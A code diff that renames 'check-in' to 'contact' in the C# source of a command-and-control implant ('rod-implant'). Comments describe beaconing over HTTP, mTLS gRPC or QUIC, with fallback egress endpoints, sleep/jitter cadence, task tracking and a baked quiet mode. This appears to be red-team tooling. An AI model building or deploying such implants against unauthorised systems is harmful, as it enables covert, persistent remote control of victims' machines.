@@ -68,7 +68,7 @@ internal static class ImplantApp
 
         // The egress walk (architecture.md Sec 8): the primary endpoint plus the
         // baked fallbacks, shared by enroll and beacon so the entry that answers
-        // enroll is the entry the first check-in dials. A dead primary walks to
+        // enroll is the entry the first contact dials. A dead primary walks to
         // the next entry at both stages; the enrolled leaf -- the identity the
         // listener sees -- never changes across the walk.
         var egress = EgressEndpoints.Of(config);
@@ -102,7 +102,7 @@ internal static class ImplantApp
             CAs = serverCAs,
         };
 
-        // The check-in clients follow the egress walk's URL shape
+        // The contact clients follow the egress walk's URL shape
         // (architecture.md Sec 8): a web entry -- an http(s):// beacon URL --
         // runs the envelope POST cycle on that port; a bare host:port runs
         // the mTLS gRPC stream; a quic:// entry runs the QUIC stream. Which
@@ -121,7 +121,7 @@ internal static class ImplantApp
         // redelivered on another is recognized either way.
         var held = new HeldTaskLedger();
         // The live cadence: starts at the baked sleep/jitter pair, retunable at
-        // run time through the beacon.sleep verb (shared by every check-in
+        // run time through the beacon.sleep verb (shared by every contact
         // client covering this run).
         var cadence = new Cadence(config.Sleep, config.Jitter);
         // The QUIC enroll exchange's live connection (architecture.md Sec 8,
@@ -130,7 +130,7 @@ internal static class ImplantApp
         // stream the enroll rode. Every other shape (and a walk whose current
         // beacon entry outgrew it) leaves it unconsumed; the disposal at the
         // end is the no-op-or-harmless-close either way.
-        var setup = new CheckInSetup(config, enrollment, enroll, egress, nonces, held, log, cadence, enrollConnection);
+        var setup = new ContactSetup(config, enrollment, enroll, egress, nonces, held, log, cadence, enrollConnection);
         var clients = TransportSelection.CreateClients(setup);
         try
         {
@@ -144,11 +144,11 @@ internal static class ImplantApp
                     // other shape's front). Say so and stop rather than dial
                     // the wrong client.
                     Console.Error.WriteLine(
-                        $"rod-implant: no check-in client for beacon URL '{egress.CurrentBeaconUrl}'");
+                        $"rod-implant: no contact client for beacon URL '{egress.CurrentBeaconUrl}'");
                     return 1;
                 }
                 var exit = await client.RunAsync(cts.Token);
-                if (exit == CheckInExit.Terminate)
+                if (exit == ContactExit.Terminate)
                     break;
             }
         }
@@ -324,7 +324,7 @@ internal static class BakedProfileSupport
         SetEnvIfPresent(root, "requestTimeout", "ROD_REQUEST_TIMEOUT");
         SetEnvIfPresent(root, "envelope", "ROD_ENVELOPE");
         SetEnvIfPresent(root, "envelopeKey", "ROD_ENVELOPE_KEY");
-        SetEnvIfPresent(root, "checkinEnvelope", "ROD_CHECKIN_ENVELOPE");
+        SetEnvIfPresent(root, "contactEnvelope", "ROD_CONTACT_ENVELOPE");
         // The pipeline bakes quiet=true for every artifact; a debugging run
         // presets ROD_QUIET=0 to override it (SetEnvIfPresent leaves an
         // already-set variable untouched).
